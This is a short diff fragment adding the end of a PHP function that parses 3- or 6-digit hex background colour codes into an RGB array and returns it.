+			$r = substr( $bc_matches[1], 0, 1 );
+			$g = substr( $bc_matches[1], 1, 1 );
+			$b = substr( $bc_matches[1], 2, 1 );
+			$op['bg'] = array( hexdec( $r . $r ), hexdec( $g . $g ), hexdec( $b . $b ) );
+		} elseif ( 6 == strlen( $bc_matches[1] ) ) {
+			$r = substr( $bc_matches[1], 0, 2 );
+			$g = substr( $bc_matches[1], 2, 2 );
+			$b = substr( $bc_matches[1], 4, 2 );
+			$op['bg'] = array( hexdec( $r ), hexdec( $g ), hexdec( $b ) );
+		}
+	}
+
+	return $op;
+}
+
+?>
